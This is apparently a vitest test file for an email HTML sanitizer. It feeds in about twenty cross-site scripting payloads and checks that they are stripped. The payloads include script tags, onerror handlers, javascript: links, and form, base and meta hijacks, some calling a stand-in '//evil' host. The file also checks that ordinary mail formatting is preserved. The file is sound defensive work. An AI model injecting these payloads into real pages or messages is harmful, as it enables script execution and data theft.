/**
 * Adversarial coverage for inbound HTML hardening.
 *
 * The sandboxed iframe is the real boundary, but it is granted `allow-scripts`
 * so it can report its own height — which means anything this misses actually
 * executes (in an opaque origin). These cases are the ones a hostile sender
 * would reach for.
 */
import { describe, expect, it } from 'vitest';
import { sanitizeEmailHtml } from '../src/lib/sanitize-html';

const containsExecutable = (html: string) =>
  /<script|<iframe|<object|<embed|<form|<base|<meta|<link|\son\w+\s*=|javascript:|vbscript:/i.test(
    html
  );

describe('sanitizeEmailHtml removes executable constructs', () => {
  it.each([
    ['inline script', '<p>hi</p><script>fetch("//evil")</script>'],
    ['uppercase script', '<SCRIPT>alert(1)</SCRIPT>'],
    ['script with attributes', '<script type="text/javascript" src="//evil/x.js"></script>'],
    ['unclosed script', '<script>alert(1)'],
    ['onerror handler', '<img src=x onerror="fetch(\'//evil\')">'],
    ['onload single-quoted', "<body onload='steal()'>"],
    ['unquoted handler', '<img src=x onerror=alert(1)>'],
    ['mixed-case handler', '<img src=x OnErRoR="alert(1)">'],
    ['javascript: href', '<a href="javascript:alert(1)">click</a>'],
    ['javascript: with spaces', '<a href="  javascript:alert(1)">click</a>'],
    ['vbscript: href', '<a href="vbscript:msgbox">click</a>'],
    ['data:text/html src', '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'],
    ['nested iframe', '<div><iframe src="//evil"></iframe></div>'],
    ['object tag', '<object data="//evil/x.swf"></object>'],
    ['embed tag', '<embed src="//evil">'],
    ['form post', '<form action="//evil" method="post"><input name="a"></form>'],
    ['base tag hijack', '<base href="//evil/">'],
    ['meta refresh', '<meta http-equiv="refresh" content="0;url=//evil">'],
    ['stylesheet link', '<link rel="stylesheet" href="//evil/x.css">'],
    ['style block', '<style>body{background:url("//evil/track")}</style>'],
    ['formaction', '<button formaction="javascript:alert(1)">go</button>'],
  ])('strips %s', (_label, input) => {
    expect(containsExecutable(sanitizeEmailHtml(input))).toBe(false);
  });

  it('is idempotent', () => {
    const once = sanitizeEmailHtml('<script>a</script><img src=x onerror=b>');
    expect(sanitizeEmailHtml(once)).toBe(once);
  });

  it('handles empty and missing input', () => {
    expect(sanitizeEmailHtml('')).toBe('');
    expect(sanitizeEmailHtml(undefined as unknown as string)).toBe('');
  });
});

describe('sanitizeEmailHtml preserves legitimate mail', () => {
  it('keeps ordinary formatting', () => {
    const html = '<p>Hello <strong>there</strong>, see <em>below</em>.</p><ul><li>one</li></ul>';
    expect(sanitizeEmailHtml(html)).toBe(html);
  });

  it('keeps safe links and images', () => {
    const html = '<a href="https://example.com/x?a=1&b=2">link</a><img src="https://cdn/x.png">';
    expect(sanitizeEmailHtml(html)).toBe(html);
  });

  it('keeps mailto and relative links', () => {
    const html = '<a href="mailto:a@b.com">mail</a><a href="/local">rel</a>';
    expect(sanitizeEmailHtml(html)).toBe(html);
  });

  it('keeps inline style attributes, which cannot execute', () => {
    const html = '<td style="background:#fff;padding:8px">cell</td>';
    expect(sanitizeEmailHtml(html)).toBe(html);
  });

  it('keeps the data: image URIs the processor embeds for inline parts', () => {
    const html = '<img src="data:image/png;base64,iVBORw0KGgo=">';
    expect(sanitizeEmailHtml(html)).toBe(html);
  });

  it('does not mangle text that merely looks like an attribute', () => {
    const html = '<p>Spend less on advertising and on marketing.</p>';
    expect(sanitizeEmailHtml(html)).toBe(html);
  });

  it('keeps table layout used by virtually every marketing email', () => {
    const html = '<table><tr><td width="100">a</td></tr></table>';
    expect(sanitizeEmailHtml(html)).toBe(html);
  });

  it('does not throw on out-of-range numeric references, which would block delivery', () => {
    const html = '<a href="&#99999999;">a</a><img src="&#x110000;">';
    expect(sanitizeEmailHtml(html)).toBe(html);
  });
});
